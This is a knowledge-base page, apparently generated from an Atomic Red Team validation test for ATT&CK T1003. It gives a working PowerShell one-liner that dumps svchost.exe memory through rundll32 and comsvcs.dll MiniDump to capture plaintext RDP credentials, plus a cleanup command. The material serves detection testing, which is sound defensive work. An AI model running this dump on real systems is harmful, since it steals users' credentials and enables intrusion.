---
atomic_guid: "d400090a-d8ca-4be0-982e-c70598a23de9"
title: "Dump svchost.exe to gather RDP credentials"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003"
attack_technique_name: "OS Credential Dumping"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "d400090a-d8ca-4be0-982e-c70598a23de9"
  - "Dump svchost.exe to gather RDP credentials"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Dump svchost.exe to gather RDP credentials

The svchost.exe contains the RDP plain-text credentials.
Source: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/

Upon successful execution, you should see the following file created $env:TEMP\svchost-exe.dmp.

## Metadata

- Atomic GUID: d400090a-d8ca-4be0-982e-c70598a23de9
- Technique: T1003: OS Credential Dumping
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1003/T1003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full
```

### Cleanup

```powershell
Remove-Item $env:TEMP\svchost-exe.dmp -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.yaml)
